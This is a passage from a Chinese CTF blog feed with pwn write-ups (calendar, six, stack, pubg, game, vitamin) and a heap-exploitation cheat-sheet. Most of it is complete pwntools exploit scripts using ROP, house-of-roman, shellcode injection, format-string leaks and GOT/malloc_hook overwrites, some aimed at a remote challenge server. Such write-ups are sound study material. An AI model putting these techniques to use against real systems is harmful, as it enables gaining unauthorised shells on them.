class="line">sh.recvuntil(&apos;[Y/N]\n&apos;)</span><br><span class="line">sh.sendline(&apos;Y&apos;)</span><br><span class="line">shellcode = &apos;a&apos; * 0x108 + p64(canary) + p64(0)</span><br><span class="line">shellcode += p64(0x0000000000401573) + p64(next(libc.search(&apos;/bin/sh&apos;)) + libc_addr) + p64(libc_addr + libc.symbols[&apos;system&apos;])</span><br><span class="line">sh.send(shellcode)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="calendar"><a href="#calendar" class="headerlink" title="calendar"></a>calendar</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>选项题 add edit delete ，但是没有show函数</p><p>add 最多可以控制四个chunk，申请最大size为0x68</p><p>edit 可以输入新的size，只有在新的size小于等于原先输入的size时，可以输入内容</p><p>delete 只有free，存在UAF</p><p>程序在输入字符串时的get_str函数存在off-by-one漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for ( i = 0; (signed int)i &lt;= len; ++i )      // off by one</span><br></pre></td></tr></table></figure><p>题目提示house of roman</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>刚开始看到没有show 函数，感觉就有点无从下手，根据house of roman的提示，去看一下这种利用方法，确实是基于没有show功能的情况下的利用方法，拿这个题顺便学习一下。</p><p>查看保护,全开（丧心病狂）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p><p>本地关闭随机化进行调试，调试成功后进行爆破就行了(玄学爆破，getshell要看命)</p><p>house of roman 利用 局部写 减少随机化的程度，从而给出爆破的可能<br>其相当于结合了fastbin attack 与 unsortedbin attack ，在没有泄露函数地址的情况下，利用unsortedbin 的首chunk的fd bk指向main_arena+88，也就是在malloc_hook附近。</p><p><em>ps: 如果是 64 位程序，通过malloc_printerr 触发 malloc ，基本可以稳定 getshell .</em></p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">#sh=process(&apos;./task_calendar&apos;)</span><br><span class="line"></span><br><span class="line">def add(idx,size):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,str(idx))</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,str(size))</span><br><span class="line"></span><br><span class="line">def edit(idx,size,info):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,&apos;2&apos;)</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,str(idx))</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,str(size))</span><br><span class="line">sh.sendafter(&apos;&gt;&apos;,info)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,&apos;3&apos;)</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">sh.recvuntil(&apos;input calendar name&gt; &apos;)</span><br><span class="line">sh.sendline(&apos;name&apos;)</span><br><span class="line"></span><br><span class="line">add(1,0x68)</span><br><span class="line">add(2,0x68)</span><br><span class="line">add(3,0x68)</span><br><span class="line"></span><br><span class="line">#------make chunk2 free to unsorted bin----------</span><br><span class="line"></span><br><span class="line">edit(3,0x68,p64(0)*2+p64(0x90)+p64(0x51)+&apos;\n&apos;)</span><br><span class="line">edit(1,0x68,&apos;a&apos;*0x68+&apos;\x91&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">dele(2)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#----fastbin attack-----------------------------</span><br><span class="line"></span><br><span class="line">edit(1,0x68,&apos;a&apos;*0x68+&apos;\x71&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">dele(3)</span><br><span class="line">edit(3,1,&apos;\x70\x70&apos;)</span><br><span class="line">edit(2,1,&apos;\xfd\x1a&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#--fastbin[0x70]= chunk3-&gt; chunk2 -&gt;malloc_hook-13-----</span><br><span class="line">add(1,0x60)</span><br><span class="line">add(4,0x60)</span><br><span class="line">add(3,0x60)</span><br><span class="line"></span><br><span class="line"># fix fastbinY---------</span><br><span class="line">dele(4)</span><br><span class="line">edit(4,7,p64(0))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#----unsorted bin attack-------------------------</span><br><span class="line"></span><br><span class="line">add(1,0x60)</span><br><span class="line">edit(1,9,p64(0)+&apos;\x00\x1b&apos;)</span><br><span class="line">add(1,0x60)</span><br><span class="line"></span><br><span class="line">#----edit malloc_hook to one_gadget--------------</span><br><span class="line"></span><br><span class="line">one_off = 0xf66f0</span><br><span class="line">edit(3,5,&apos;aaa\xa4\xd2\xaf&apos;)</span><br><span class="line"></span><br><span class="line">dele(4)</span><br><span class="line">dele(4)</span><br><span class="line"></span><br><span class="line">for i in range(10000):</span><br><span class="line">sh = process(&apos;./task_calendar&apos;)</span><br><span class="line">try:</span><br><span class="line">exp()</span><br><span class="line"></span><br><span class="line">break;</span><br><span class="line">except:</span><br><span class="line">print i</span><br><span class="line">sh.close()</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="six"><a href="#six" class="headerlink" title="six"></a>six</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>一道感觉很奇怪的题目，不容易看懂</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  void (__fastcall *v3)(__int64, char *); // ST08_8</span><br><span class="line">  size_t v4; // rax</span><br><span class="line">  char *v5; // rbx</span><br><span class="line">  size_t v6; // rax</span><br><span class="line">  char s; // [rsp+10h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v9; // [rsp+18h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(0x28u);</span><br><span class="line">  mmap2chunk();</span><br><span class="line">  </span><br><span class="line">  `</span><br><span class="line">  fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">  read(fd, &amp;buf, 6uLL);</span><br><span class="line">  read(fd, &amp;v3, 6uLL);</span><br><span class="line">  dest = mmap((void *)(v3 &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7, 34, -1, 0LL);       --》rwx 高地址</span><br><span class="line">  qword_202098 = (__int64)mmap((void *)(buf &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 3, 34, -1, 0LL) + 0x500;    --》rw  低地址</span><br><span class="line">  `</span><br><span class="line"></span><br><span class="line">  v3 = (void (__fastcall *)(__int64, char *))dest;</span><br><span class="line">  memset(&amp;s, 0, 8uLL);</span><br><span class="line">  puts(&quot;Show Ne0 your shellcode:&quot;);</span><br><span class="line">  read(0, &amp;s, 6uLL);</span><br><span class="line">  judge_shellcode((__int64)&amp;s);</span><br><span class="line">  v4 = strlen(src);</span><br><span class="line">  memcpy(dest, src, v4);</span><br><span class="line">  v5 = (char *)dest;</span><br><span class="line">  v6 = strlen(src);</span><br><span class="line">  memcpy(&amp;v5[v6], &amp;s, 7uLL);</span><br><span class="line">  v3(qword_202098, &amp;s);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序刚开始mmap了两个地址，之后要求读入6个字节的shellcode，进入judge_shellcode进行判断，需要六个字节各不相同<br>最后会将src代码复制到第一个chunk 并执行其中的代码</p><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>思路就是六个字节通过系统调用read函数，同时将rsi设置为rsp，即之后输入到栈顶，溢出到第一个chunk(即高地址的chunk)，将shellcode写入即可<br>(大概思路应该是这样，但是题目本身理解的还不是特别清楚，后面还得再看)</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./six&apos;)</span><br><span class="line"></span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line">sc=&apos;&apos;&apos;push rsp;pop rsi;lahf;xchg edx,eax;syscall&apos;&apos;&apos;</span><br><span class="line">sc = asm(sc)</span><br><span class="line">sh.sendafter(&apos;:&apos;,sc)</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*(0x1000-0x500)</span><br><span class="line">pay+=&apos;\x90&apos;*0x36+asm(shellcraft.sh())</span><br><span class="line">sh.sendline(pay)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;huwang&quot;&gt;&lt;a href=&quot;#huwang&quot; class=&quot;headerlink&quot; title=&quot;huwang&quot;&gt;&lt;/a&gt;huwang&lt;/h1&gt;&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
  </entry>
  
  <entry>
    <title>Pwn Heap leak addr &amp;&amp; getshell</title>
    <link href="http://siriuswhiter.tk/2019/02/14/pwn-heap-leak-addr-getshell/"/>
    <id>http://siriuswhiter.tk/2019/02/14/pwn-heap-leak-addr-getshell/</id>
    <published>2019-02-14T05:37:18.000Z</published>
    <updated>2019-02-14T06:09:12.063Z</updated>
    
    <content type="html"><![CDATA[<p><em>在堆相关的题中经常需要泄露地址及最后的getshell，总结一下比较常用的方法：</em></p><h1 id="Leak-Address"><a href="#Leak-Address" class="headerlink" title="Leak Address"></a>Leak Address</h1><h2 id="heap-base"><a href="#heap-base" class="headerlink" title="heap base"></a>heap base</h2><ol><li>最常用的即在存在UAF或溢出之类的条件下，因为fastbin 在内存中为单链存放，之后释放的fastbin范围的chunk的fd指针会指向之前释放的等大小范围的chunk，泄露fd指针即可得到heap base</li><li>main arena中存放着top chunk的地址，如果有条件泄露其地址便可以得到heap base</li></ol><h2 id="libc-base"><a href="#libc-base" class="headerlink" title="libc base"></a>libc base</h2><ol><li>unsorted bin为双向链表，而第一个unsorted bin的fd 与 bk指针都指向main_arena+88 处，泄露指针处即可计算得到libc base</li></ol><h2 id="stack-addr"><a href="#stack-addr" class="headerlink" title="stack addr"></a>stack addr</h2><ol><li>一般在可以得到libc base的情况下，可以利用libc中存放的_environ指针，该指针指向栈中环境变量的位置，泄露该指针的值便可以得到栈地址</li></ol><h1 id="Get-Shell"><a href="#Get-Shell" class="headerlink" title="Get Shell"></a>Get Shell</h1><h2 id="write-to-plt-got"><a href="#write-to-plt-got" class="headerlink" title="write to .plt.got"></a>write to .plt.got</h2><p>当程序保护中got表不满时 即 ： RELRO: Partial RELRO 。此时got表可写，可以将某个函数的got地址改写为system()函数的地址，然后想办法将’/bin/sh’传参进去，get shell</p><h2 id="write-to-malloc-hook-or-free-hook"><a href="#write-to-malloc-hook-or-free-hook" class="headerlink" title="write to malloc_hook or free_hook"></a>write to malloc_hook or free_hook</h2><p>malloc_hook &amp;&amp; free_hook 是程序在调用malloc或free时会首先检查的地方，如果不为空，会先执行其指针指向的地方，所以如果将one_gadget或system(‘/bin/sh’)的地址写向该地址，便可以 get shell</p><h2 id="write-to-stack"><a href="#write-to-stack" class="headerlink" title="write to stack"></a>write to stack</h2><p>一般来说，这个真的是没有办法的话才用，利用上面的方法得到栈地址后，利用漏洞将one_gadget或system(‘/bin/sh’)的地址写向返回地址，这样程序在退出时便会getshell</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;在堆相关的题中经常需要泄露地址及最后的getshell，总结一下比较常用的方法：&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;Leak-Address&quot;&gt;&lt;a href=&quot;#Leak-Address&quot; class=&quot;headerlink&quot; title=&quot;Leak Addres
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>l3c-sec Pwn Recruit New Questions</title>
    <link href="http://siriuswhiter.tk/2019/02/12/l3c-sec-pwn-recruit-new-questions/"/>
    <id>http://siriuswhiter.tk/2019/02/12/l3c-sec-pwn-recruit-new-questions/</id>
    <published>2019-02-12T11:52:35.000Z</published>
    <updated>2019-02-26T14:16:45.751Z</updated>
    
    <content type="html"><![CDATA[<p><em>华科一个新战队的招新题，正好最近没有兴致继续下去，来玩一玩招新题</em></p><h1 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h1><p>最简单的栈溢出</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./stack&apos;)</span><br><span class="line">sh =remote(&apos;159.65.68.241&apos;,&apos;10003&apos;)</span><br><span class="line">sys_addr = 0x80491e2</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*0x3a +&apos;bbbb&apos;+p32(sys_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(pay)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="pubg"><a href="#pubg" class="headerlink" title="pubg"></a>pubg</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>先是一大段将随机值写入key.txt然后读出等等，然后将输入的值与读出的值进行比较，相等则进入overflow函数，栈溢出getshell就行。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>前面一大段其实是可以不用管的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_401DDC(int time, void *ptr)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [rsp+10h] [rbp-50h]</span><br><span class="line">  FILE *stream; // [rsp+50h] [rbp-10h]</span><br><span class="line">  unsigned int i; // [rsp+5Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  stream = fopen(&quot;./key.txt&quot;, &quot;w&quot;);</span><br><span class="line">  for ( i = 0; time + 1 &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    memset(&amp;s, 0, 0x40uLL);</span><br><span class="line">    sub_401B55((__int64)ptr, (__int64)&amp;s, 0x10u);</span><br><span class="line">    memset(ptr, 0, 0x40uLL);</span><br><span class="line">    strcpy((char *)ptr, &amp;s);</span><br><span class="line">  &#125;</span><br><span class="line">  fwrite(ptr, 0x20uLL, 1uLL, stream);           // s --&gt; file</span><br><span class="line">  return fclose(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在这一段里可以发现如果输入的time=-1，那么整个写入的循环便会被跳过，随后输入空值便可以进入overflow函数，溢出getshell</p><p>需要注意的是前面需要先写入一次使得key.txt创建，如果文件已经创建的话其实就可以不用了。</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">#p=process(&apos;./pubg&apos;)</span><br><span class="line">p=remote(&apos;159.65.68.241&apos;,9001)</span><br><span class="line">p.recvuntil(&apos;code&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">p.recvuntil(&apos;:&apos;)</span><br><span class="line">p.sendline(&apos;-2&apos;)</span><br><span class="line">time.sleep(5)</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line">#p=process(&apos;./pubg&apos;)</span><br><span class="line">p=remote(&apos;159.65.68.241&apos;,9001)</span><br><span class="line">p.recvuntil(&apos;code&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">p.recvuntil(&apos;:&apos;)</span><br><span class="line">p.sendline(&apos;-1&apos;)</span><br><span class="line">p.recvuntil(&apos;:&apos;)</span><br><span class="line">p.send(&apos;\x00&apos;*16)</span><br><span class="line">p.recvuntil(&apos;:&apos;)</span><br><span class="line">p.send(&apos;A&apos;*0x28+p64(0x401BED))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="game"><a href="#game" class="headerlink" title="game"></a>game</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">unsigned int Game()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; // eax</span><br><span class="line">  unsigned int v1; // eax</span><br><span class="line">  char s; // [esp+Ch] [ebp-10Ch]</span><br><span class="line">  char v4; // [esp+106h] [ebp-12h]</span><br><span class="line">  char v5; // [esp+107h] [ebp-11h]</span><br><span class="line">  char v6; // [esp+108h] [ebp-10h]</span><br><span class="line">  char v7; // [esp+109h] [ebp-Fh]</span><br><span class="line">  char v8; // [esp+10Ah] [ebp-Eh]</span><br><span class="line">  unsigned int v9; // [esp+10Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v9 = __readgsdword(0x14u);</span><br><span class="line">  memset(&amp;s, 0, 0x100u);</span><br><span class="line">  v0 = time(0);</span><br><span class="line">  srand(v0);</span><br><span class="line">  v4 = rand();</span><br><span class="line">  v5 = rand();</span><br><span class="line">  v6 = rand();</span><br><span class="line">  v7 = rand();</span><br><span class="line">  v8 = 0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  puts(&quot;What&apos;s your magic string?&quot;);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  v1 = Hash(&amp;s);</span><br><span class="line">  if ( v1 == *(_DWORD *)&amp;v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Congraz!! Your magic string is:&quot;);</span><br><span class="line">    printf(&amp;s);                                 // fmt</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Wrong!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>有个明显的栈溢出与fmt漏洞，一共三次机会<br>思路便是输入格式化字符串并使用\x00截断，同时溢出至v4，因为hash中的算法已知且其使用strlen，因此可以利用其将输入的\x00之前的字符串的hash计算出来，并将其写入v4，这样通过检查，利用fmt漏洞分别泄露canary 与libc基址，最后一次覆盖栈返回地址为已给的hacker函数即可</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.terminal=[&apos;bash&apos;]</span><br><span class="line">#context.log_level=&apos;debug&apos;</span><br><span class="line">#p=process(&apos;./game&apos;)</span><br><span class="line">p=remote(&apos;159.65.68.241&apos;,10002)</span><br><span class="line">p.recvuntil(&apos;?&apos;)</span><br><span class="line">p.sendline(&apos;%71$p&apos;.ljust(250,b&apos;\x00&apos;)+p32(0x365))</span><br><span class="line">p.recvuntil(&apos;:\n&apos;)</span><br><span class="line">canary=p.recvuntil(&apos;W&apos;)[:-1]</span><br><span class="line">print(&apos;canary is &apos;+ canary)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#pause()</span><br><span class="line">p.sendline(&apos;%3$p&apos;.ljust(250,&apos;\x00&apos;)+p32(0x19))</span><br><span class="line">p.recvuntil(&apos;:\n&apos;)</span><br><span class="line">base=p.recvuntil(&apos;W&apos;)[:-1]</span><br><span class="line">print(&apos;base is &apos;+ base)</span><br><span class="line">p.sendline(&apos;\x00&apos;*0x100+p32(int(canary,16))+&apos;A&apos;*12+p32(int(base[:-3]+&apos;2f5&apos;,16)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="vitamin"><a href="#vitamin" class="headerlink" title="vitamin"></a>vitamin</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>简单的堆，基本上没有检查</p><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>UAF将堆分配到bss段改buf指针指向got表，修改got表某个函数即可</p><p>(前面傻逼了好久，忘了开始的fork，调试attach不上进程，懵逼了好久)</p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line">context.log_level=&apos;debug&apos; </span><br><span class="line">p=process(&apos;./vitamin&apos;) </span><br><span class="line">#p=remote(&apos;159.65.68.241&apos;, 10001) </span><br><span class="line"></span><br><span class="line">def debug(addr = &apos;0x400BC7&apos;):     </span><br><span class="line">  gdb.attach(proc.pidof(p)[0]+1, &quot;b *&quot; + addr)     </span><br><span class="line">  raw_input(&apos;debug:&apos;) </span><br><span class="line"></span><br><span class="line">def create(formula):     </span><br><span class="line">  p.recvuntil(&apos;:\n&apos;)     </span><br><span class="line">  p.sendline(&apos;1&apos;)     </span><br><span class="line">  p.recvuntil(&apos;:\n&apos;)     </span><br><span class="line">  p.sendline(formula) </span><br><span class="line"> </span><br><span class="line">def change(formula):     </span><br><span class="line">  p.recvuntil(&apos;:\n&apos;)     </span><br><span class="line">  p.sendline(&apos;3&apos;)     </span><br><span class="line">  p.recvuntil(&apos;:\n&apos;)     </span><br><span class="line">  p.sendline(formula) </span><br><span class="line"> </span><br><span class="line">def take():     </span><br><span class="line">  p.recvuntil(&apos;:\n&apos;)     </span><br><span class="line">  p.sendline(&apos;2&apos;) #debug() </span><br><span class="line"> </span><br><span class="line">free_got=0x602018 </span><br><span class="line">create(&apos;aaaa&apos;) </span><br><span class="line">take() </span><br><span class="line">change(p64(0x6020dd)) </span><br><span class="line">create(p64(0x6020dd)) </span><br><span class="line">create(&apos;A&apos;*11+p64(free_got)) </span><br><span class="line">change(p64(0x400d58)) </span><br><span class="line">p.sendline(&apos;2&apos;) </span><br><span class="line">take()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="store"><a href="#store" class="headerlink" title="store"></a>store</h1><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><p>选项题，功能有add,read,sell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 